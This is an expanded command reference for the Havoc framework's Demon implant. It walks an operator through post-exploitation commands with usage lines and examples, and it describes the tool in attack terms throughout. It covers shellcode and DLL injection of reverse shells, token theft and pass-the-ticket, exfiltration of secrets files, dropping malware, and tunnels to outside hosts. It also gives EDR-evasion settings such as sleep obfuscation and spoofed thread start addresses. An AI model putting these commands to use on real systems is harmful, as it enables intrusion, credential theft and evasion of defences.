# Havoc Demon - Expanded Command Documentation (English)

Original Project Link: [https://github.com/havocframework/havoc](https://github.com/havocframework/havoc)

---

### help
Shows help message of specified command.
**Usage:** `help [command]`
Lists in-system help and usage details for any command or module present in the Demon agent. If no parameter is entered, it returns the list of all commands.
**Examples:**
- `help`
- `help inline-execute`
- `help token`

### sleep
Sets the delay to sleep and jitter.
**Usage:** `sleep [delay] (jitter)`
Determines the check-in interval of the Demon with the Teamserver. The "Jitter" parameter is specified as a percentage and helps to hide from security systems by disrupting the regular traffic pattern (T1029, TA0005).
**Examples:**
- `sleep 10`
- `sleep 60 15`

### checkin
Request a check-in request.
**Usage:** `checkin`
Communicates with the server instantly without waiting for the current sleep cycle. Used to fetch queued tasks or quickly update agent status.
**Examples:**
- `checkin`

### job list
List of active background jobs.
**Usage:** `job list`
Lists all current asynchronous tasks running in the background on the Demon. Provides information about job IDs and their status. Operates purely via API.
**Examples:**
- `job list`

### job suspend
Suspend specified job ID.
**Usage:** `job suspend [id]`
Temporarily pauses a running background task. The process is not terminated but halted until a resume command is issued.
**Examples:**
- `job suspend 1337`

### job resume
Resume specified job ID.
**Usage:** `job resume [id]`
Restarts a background task that was previously paused with the `job suspend` command from where it left off.
**Examples:**
- `job resume 1337`

### job kill
Kill specified job ID.
**Usage:** `job kill [id]`
Completely cancels a running or suspended background process and clears it from memory.
**Examples:**
- `job kill 1337`

### task list
List of commands in the task queue.
**Usage:** `task list`
Lists the commands queued on the Teamserver side that the agent has not yet received or executed.
**Examples:**
- `task list`

### task clear
Clear all commands in the task queue.
**Usage:** `task clear`
Clears the queue by canceling all pending tasks on the server side that have not yet been fetched and executed by the agent. Ideal for preventing accidental command spam.
**Examples:**
- `task clear`

### proc list
Displays a list of running processes on the target.
**Usage:** `proc list`
Lists in detail the currently active processes (Process ID, name, architecture, etc.) on the target machine. Uses Process Discovery (T1057) techniques.
**Examples:**
- `proc list`

### proc kill
Kills the process from specified PID.
**Usage:** `proc kill [pid]`
Forcefully closes the application running on the target system with the given Process ID (PID). Sends a direct process termination request (TA0040) using APIs.
**Examples:**
- `proc kill 1337`

### proc create
Create a new process.
**Usage:** `proc create [normal/suspended] (--silent) (--no-pipe) [process] (args)`
Starts a new application on the target system, optionally in a normal or suspended state (T1106). The `suspended` parameter is highly useful for process injection operations.
**Examples:**
- `proc create suspended --no-pipe C:\Windows\System32\notepad.exe`

### proc modules
Lists loaded modules/dlls from a remote process.
**Usage:** `proc modules [pid]`
Lists the DLLs and memory modules loaded into the memory space of the specified process. Can be used to check if security software has hooked the process (TA0007).
**Examples:**
- `proc modules 1337`

### proc grep
Grep information from the specified remote process.
**Usage:** `proc grep [process name]`
Finds all instances of the specified application within the memory and process list. Utilizes Process Discovery (T1020) for advanced process hunting.
**Examples:**
- `proc grep explorer.exe`

### proc memory
Query for memory regions.
**Usage:** `proc memory [pid] [permission type]`
Queries memory regions on the specified process matching the given memory permission filters (e.g., PAGE_READWRITE). Critical for memory analysis before shellcode injection (T1055).
**Examples:**
- `proc memory 1337 PAGE_EXECUTE_READWRITE`

### transfer list
List current downloads.
**Usage:** `transfer list`
Displays the active file transfers (downloads or uploads) currently being processed by the agent, along with their File IDs.
**Examples:**
- `transfer list`

### transfer stop
Stops a download.
**Usage:** `transfer stop <FileID>`
Safely cancels and halts an ongoing file transfer operation using its specific File ID.
**Examples:**
- `transfer stop ffff`

### transfer resume
Resumes a download.
**Usage:** `transfer resume <FileID>`
Continues a previously paused or interrupted file download/upload transfer from where it stopped.
**Examples:**
- `transfer resume ffff`

### transfer remove
Stops and removes a download.
**Usage:** `transfer remove <FileID>`
Cancels an ongoing file transfer and completely removes it from the transfer history list.
**Examples:**
- `transfer remove ffff`

### dir
List specified directory.
**Usage:** `dir [/path/to/dir] [/s] [/b] [/d] [/f] [/starts foo] [/contains foo] [/ends foo]`
Used for File and Directory Discovery (T1083). Can scan subfolders (`/s`), and find files starting with, containing, or ending with specific keywords.
**Examples:**
- `dir C:\Users /s /b /f /ends .ps1`

### download
Downloads a specified file.
**Usage:** `download [/path/to/file.txt]`
Reads a file from the target system and downloads it to the Teamserver. Operates at the API level for stealthy data exfiltration.
**Examples:**
- `download c:\secrets.txt`

### upload
Uploads a specified file.
**Usage:** `upload [/local/file] [/remote/path]`
Transfers a file from the C2 server to the specified directory on the target system (e.g., to drop malware or tools).
**Examples:**
- `upload /tmp/reverse_shell.exe c:\Windows\Temp\malware.exe`

### cd
Change to specified directory.
**Usage:** `cd [/path/to/dir]`
Changes the current working directory of the agent. This API-based operation sets the reference path for subsequent commands.
**Examples:**
- `cd C:\Users\Admin\Documents`

### cp
Copy file from one location to another.
**Usage:** `cp [source_file] [target_file]`
Takes a file on the target system and duplicates it to a specified new location. Used for data collection and hiding.
**Examples:**
- `cp C:\secrets.txt C:\Windows\Temp\secrets.txt`

### mv
Move file from one location to another.
**Usage:** `mv [source_file] [target_file]`
Transfers the file to its new destination by deleting it from its original location. Can also be used to rename a file.
**Examples:**
- `mv C:\secrets.txt C:\Windows\Temp\hidden.txt`

### remove
Remove file or directory.
**Usage:** `remove [path]`
Completely deletes the specified directory or file to remove unnecessary traces on the target system.
**Examples:**
- `remove C:\Windows\Temp\malware.exe`

### mkdir
Create new directory.
**Usage:** `mkdir [/path/to/new/dir]`
Creates a new directory (folder) in the target file system.
**Examples:**
- `mkdir C:\Windows\Temp\NewDir`

### pwd
Get current directory.
**Usage:** `pwd`
Shows from which folder on the target computer the agent is currently executing commands.
**Examples:**
- `pwd`

### cat
Display content of the specified file.
**Usage:** `cat [/path/to/file.txt]`
Reads the data inside text files and prints it to the terminal as agent output. Especially designed for reading config and password files.
**Examples:**
- `cat c:\secrets.txt`

### screenshot
Takes a screenshot.
**Usage:** `screenshot`
Captures the current view of the target computer's desktop screen and transfers it to the Teamserver.
**Examples:**
- `screenshot`

### shell
Executes cmd.exe commands and gets the output.
**Usage:** `shell [commands]`
Executes commands using the Windows command prompt (cmd.exe) via Process Creation behavior. Output is routed directly back to the operator.
**Examples:**
- `shell dir c:\windows\system32`

### powershell
Executes powershell.exe commands and gets the output.
**Usage:** `powershell [commands]`
Executes commands using the target system's PowerShell engine. Ideal for leveraging rich scripting capabilities.
**Examples:**
- `powershell Get-Process`

### inline-execute
Executes an object file (BOF).
**Usage:** `inline-execute [/path/to/objectfile.o] (arguments)`
Executes Beacon Object Files (BOF) directly within the Demon's own memory space. Since it does not create a new process (API Only), it is extremely stealthy.
**Examples:**
- `inline-execute /tmp/whoami.x64.o`

### shellcode inject
Inject shellcode into a remote process.
**Usage:** `shellcode inject [arch] [target pid] [/path/to/shellcode.bin]`
Injects and executes raw shellcode into the memory space of a running remote application (Process Injection, T1055).
**Examples:**
- `shellcode inject x64 1337 /tmp/rev_shell.x64.bin`

### shellcode spawn
Spawns a temporary process and injects into it.
**Usage:** `shellcode spawn [arch] [/path/to/shellcode.bin]`
Using the "Fork & Run" technique (T1055.002), it creates a temporary, benign-looking process (like rundll32.exe), injects shellcode, and executes it. Protects the main agent from crashes.
**Examples:**
- `shellcode spawn x64 /tmp/rev_shell.x64.bin`

### shellcode execute
Executes shellcode in the current process (self inject).
**Usage:** `shellcode execute [arch] [/path/to/shellcode.bin]`
Writes shellcode into the agent's own memory space (self-inject) and spins up a new thread to execute it.
**Examples:**
- `shellcode execute x64 /tmp/rev_shell.x64.bin`

### dll inject
Inject dll into a remote process.
**Usage:** `dll inject [target pid] [/path/to/module.dll] (arguments)`
Loads and executes a library into the memory space of a running process using Reflective DLL injection techniques (T1055.001).
**Examples:**
- `dll inject 1337 /tmp/module.dll argument`

### dll spawn
Spawns a temporary process and injects a dll into it.
**Usage:** `dll spawn [/path/to/module.dll] (arguments)`
Similar to shellcode spawn, it creates a new process via the "Fork & Run" principle and reflectively loads the DLL into it for safe execution.
**Examples:**
- `dll spawn /tmp/module.dll arguments`

### exit
Cleanup and exit.
**Usage:** `exit [thread/process]`
Cleans up memory traces and shuts down the running Demon agent by killing the current thread or the entire process.
**Examples:**
- `exit thread`

### token getuid
Get current uid from token.
**Usage:** `token getuid`
Shows which user token and privileges the agent is currently operating under (Access Token Manipulation, T1134).
**Examples:**
- `token getuid`

### token list
List stolen tokens from token vault.
**Usage:** `token list`
Displays a list of all stolen tokens successfully copied from the system and stored in the agent's internal "Token Vault".
**Examples:**
- `token list`

### token find
Find all tokens that can be stolen on the system.
**Usage:** `token find`
Scans system processes (T1134) to identify open token privileges that can be impersonated for Privilege Escalation.
**Examples:**
- `token find`

### token steal
Steal token from specified process and save it to token vault.
**Usage:** `token steal [pid] (handle)`
Steals the token of a highly privileged process (T1134.001) and saves it into the identity vault for later use.
**Examples:**
- `token steal 1337`

### token impersonate
Impersonate stolen token from specified vault id.
**Usage:** `token impersonate [vault id]`
Equips a specific identity stored in the Vault, allowing the agent to perform actions with that user's permissions (e.g., SYSTEM).
**Examples:**
- `token impersonate 0`

### token make
Make token from user credentials.
**Usage:** `token make [Domain] [Username] [Password] (LogonType)`
Generates a valid token by initiating a network logon (or specified type) using the provided plaintext credentials (T1134.003).
**Examples:**
- `token make domain.local Administrator Passw0rd@1234`

### token privs-list
List all privileges from current token.
**Usage:** `token privs-list`
Analyzes the potential power in the system by viewing the Windows privileges (SeDebugPrivilege, etc.) held by the current account.
**Examples:**
- `token privs-list`

### token privs-get
Enable a privilege.
**Usage:** `token privs-get [Privilege]`
Activates a Windows privilege that is present in the current token but in a disabled state (T1134).
**Examples:**
- `token privs-get SeDebugPrivilege`

### token revert
Revert to default process token.
**Usage:** `token revert`
If a token has been impersonated, this drops those privileges and reverts the agent back to the original process token it started with.
**Examples:**
- `token revert`

### token remove
Remove specified stolen token from token vault.
**Usage:** `token remove [vault id]`
Removes an unnecessary or invalid token from the local memory vault.
**Examples:**
- `token remove 1`

### token clear
Removes every stolen token from the token vault.
**Usage:** `token clear`
Safely purges all copied and stored token data, emptying the identity vault.
**Examples:**
- `token clear`

### dotnet list-versions
Lists installed/available dotnet versions.
**Usage:** `dotnet list-versions`
Discovers which .NET Framework (CLR) versions are installed on the target machine to determine compatibility.
**Examples:**
- `dotnet list-versions`

### dotnet inline-execute
Executes assembly in the current process and gets output.
**Usage:** `dotnet inline-execute [/path/to/assembly.exe] (args)`
Loads a .NET PE file (.exe) directly into the agent's memory space and returns the output stealthily using the Execute Assembly technique (T1620).
**Examples:**
- `dotnet inline-execute /tmp/Seatbelt.exe -group=all -full`

### net domain
Display domain for the current host.
**Usage:** `net domain`
Retrieves the domain name and checks whether the target device is joined to an Active Directory domain.
**Examples:**
- `net domain`

### net logons
Lists users logged onto a host.
**Usage:** `net logons [\\TARGET]`
Lists accounts that have successfully logged into the target (or local) device in the past or currently.
**Examples:**
- `net logons \\localhost`

### net sessions
Lists sessions on a host.
**Usage:** `net sessions [\\TARGET]`
Discovers who is actively connected (and from which computers) to file shares or services on the device.
**Examples:**
- `net sessions \\localhost`

### net share
Lists shares on a host.
**Usage:** `net share [\\TARGET]`
Maps the sharing paths of hidden (C$, ADMIN$) and open network folders on the remote or local machine.
**Examples:**
- `net share \\localhost`

### net localgroup
Lists local groups and users in local groups.
**Usage:** `net localgroup [\\TARGET]`
Retrieves local group configurations (e.g., Administrators group) on the system and shows their members.
**Examples:**
- `net localgroup \\localhost`

### net group
Lists groups and users in groups.
**Usage:** `net group [\\TARGET]`
Queries groups found in the target Active Directory domain. Crucial for identifying Domain Admins.
**Examples:**
- `net group \\localhost`

### net users
Lists users and user information.
**Usage:** `net users [\\TARGET]`
Pulls a list of local or domain accounts on the target system along with basic profile information.
**Examples:**
- `net users \\localhost`

### config implant.verbose
Enable/disable implant verbose logging.
**Usage:** `config implant.verbose [true/false]`
Forces the agent to print detailed internal operations (like process creation, memory allocation) to the console. Used for debugging.
**Examples:**
- `config implant.verbose true`

### config implant.sleep-obf.start-addr
Set custom thread start addr at sleep obfuscation.
**Usage:** `config implant.sleep-obf.start-addr [lib!func+offset]`
Determines the spoofed thread start address used when the agent enters sleep mode, masking its true origin (Spoofing).
**Examples:**
- `config implant.sleep-obf.start-addr ntdll!LdrLoadLibrary+0x46`

### config implant.sleep-obf.technique
Set custom sleep obfuscation technique.
**Usage:** `config implant.sleep-obf.technique [0/1/2]`
Determines how the agent obfuscates itself in memory while sleeping. 0: Normal Sleep, 1: Foliage (ROP-based), 2: Ekko.
**Examples:**
- `config implant.sleep-obf.technique 1`

### config implant.coffee.veh
Enable/disable VEH for object file loading.
**Usage:** `config implant.coffee.veh [true/false]`
Sets whether to use the Vectored Exception Handler (VEH) to prevent crashes caused by BOF executions from taking down the agent.
**Examples:**
- `config implant.coffee.veh true`

### config implant.coffee.threaded
Enable/disable threading while executing object files.
**Usage:** `config implant.coffee.threaded [true/false]`
Allows Object Files to run in the background on new threads (multithreading) without blocking the main agent execution.
**Examples:**
- `config implant.coffee.threaded true`

### config memory.alloc
Memory allocation behaviour.
**Usage:** `config memory.alloc [1/2/3]`
Sets the API call type for injection or allocation. 1: Win32 API (VirtualAllocEx), 2: Native API (NtAllocateVirtualMemory) to bypass hooks.
**Examples:**
- `config memory.alloc 2`

### config memory.execute
Memory executing behaviour (remote/local thread).
**Usage:** `config memory.execute [1/2/3/4]`
Determines how newly allocated memory is executed. 1: Win32 API (CreateRemoteThread), 2: Native API (NtCreateThreadEx).
**Examples:**
- `config memory.execute 2`

### config inject.spoofaddr
Inject code with spoofed thread start addr.
**Usage:** `config inject.spoofaddr [lib!func+offset]`
Bypasses EDR detection during Process Injection by making the thread appear as if it started from a legitimate Microsoft library.
**Examples:**
- `config inject.spoofaddr ntdll!LdrLoadLibrary+0x46`

### config inject.spawn64
Default x64 process to spawn for fork & run operations.
**Usage:** `config inject.spawn64 [C:\path\to\exe]`
Defines which trusted x64 Windows application (e.g., rundll32) is selected as the default victim for operations requiring temporary processes.
**Examples:**
- `config inject.spawn64 C:\Windows\System32\rundll32.exe`

### config inject.spawn32
Default x86 process to spawn for fork & run operations.
**Usage:** `config inject.spawn32 [C:\path\to\exe]`
Defines the default victim process for x86 (32-bit) architecture tasks requiring a temporary process.
**Examples:**
- `config inject.spawn32 C:\Windows\SysWow64\rundll32.exe`

### config killdate
Change the default KillDate.
**Usage:** `config killdate [YEAR-MONTH-DAY HOUR-MINUTE-SECOND]`
Sets the expiration date for the malware (in GMT 0). The agent automatically shuts down after this date. Set to 0 to disable.
**Examples:**
- `config killdate 2006-01-02 15:04:05`

### config workinghours
Change the working hours.
**Usage:** `config workinghours [H:mm-H-mm]`
Ensures the agent is active only during specific hours (e.g., corporate business hours) to avoid generating suspicious off-hours traffic. Set to 0 to disable.
**Examples:**
- `config workinghours 8:30-19:00`

### pivot list
List connected agent pivots.
**Usage:** `pivot list`
Shows the status of child agents connected to the current target via SMB/TCP, using it as a jump box. Operates via API only.
**Examples:**
- `pivot list`

### pivot connect
Connect to a pivoting agent.
**Usage:** `pivot connect [Host] [Address]`
Establishes a P2P (Peer-to-Peer) connection between agents, bridging to internal devices without internet access via SMB/TCP pipes.
**Examples:**
- `pivot connect HOST-DC agent_6d6e`

### pivot disconnect
Disconnect from a pivoting agent.
**Usage:** `pivot disconnect [Agent ID]`
Severs the P2P network connection with the specified parent or child agent.
**Examples:**
- `pivot disconnect 64656d6e`

### rportfwd add
Add a reverse port forward.
**Usage:** `rportfwd add [bind host] [bind port] [forward host] [forward port]`
Creates a tunnel to route internal network traffic from the target machine through the agent back to the Teamserver or an external machine.
**Examples:**
- `rportfwd add 0.0.0.0 8080 192.157.0.1 4444`

### rportfwd list
List all reverse port forwards.
**Usage:** `rportfwd list`
Lists all active Reverse Port Forwarding tunnels and open socket details.
**Examples:**
- `rportfwd list`

### rportfwd remove
Close and remove a reverse port forward.
**Usage:** `rportfwd remove [Socket ID]`
Tears down the specific active tunnel/port forward associated with the given Socket ID.
**Examples:**
- `rportfwd remove b4bbb42`

### rportfwd clear
Close and clear all reverse port forwards.
**Usage:** `rportfwd clear`
Simultaneously stops and clears all active tunneling operations.
**Examples:**
- `rportfwd clear`

### socks add
Add a socks5 proxy.
**Usage:** `socks add [bind port]`
Routes network traffic through a designated port on the attacker's side (or agent) to the target device as a SOCKS5 proxy, allowing browser-based access to the internal network.
**Examples:**
- `socks add 4444`

### socks list
List all socks5 proxy servers.
**Usage:** `socks list`
Displays the active SOCKS5 proxy sockets established by the agent.
**Examples:**
- `socks list`

### socks kill
Kill and remove a socks5 proxy server.
**Usage:** `socks kill [bind port]`
Cancels the active proxy listener on the specified local port.
**Examples:**
- `socks kill 4444`

### socks clear
Kill and clear all socks5 proxy servers.
**Usage:** `socks clear`
Resets all open and routed SOCKS5 proxy network services.
**Examples:**
- `socks clear`

### luid
Get current logon ID.
**Usage:** `luid`
Prints the unique Locally Unique Identifier (LUID) belonging to the current token. Required for actions like Pass-the-Ticket (PtT).
**Examples:**
- `luid`

### klist
List Kerberos tickets.
**Usage:** `klist [/luid 0x123| /all]`
Dumps the cached Kerberos authentication tickets (TGT/TGS) in memory for the specified LUID (or all), allowing authorization checks in an Active Directory network.
**Examples:**
- `klist /all`

### purge
Purge a Kerberos ticket.
**Usage:** `purge /luid <0x123>`
Purges Kerberos tickets associated with the selected session from memory, resetting AD authorizations or clearing ticket errors.
**Examples:**
- `purge /luid 0x123`

### ptt
Import Kerberos ticket into a logon session (Pass-the-Ticket).
**Usage:** `ptt <base64> [/luid <0x0>]`
Injects a Base64-encoded Kerberos ticket (e.g., stolen via Rubeus/Mimikatz) into the current or specified (LUID) session in target memory to escalate privileges.
**Examples:**
- `ptt doIFqjCCBaagAwIB...`

---
Original Project Link: [https://github.com/havocframework/havoc](https://github.com/havocframework/havoc)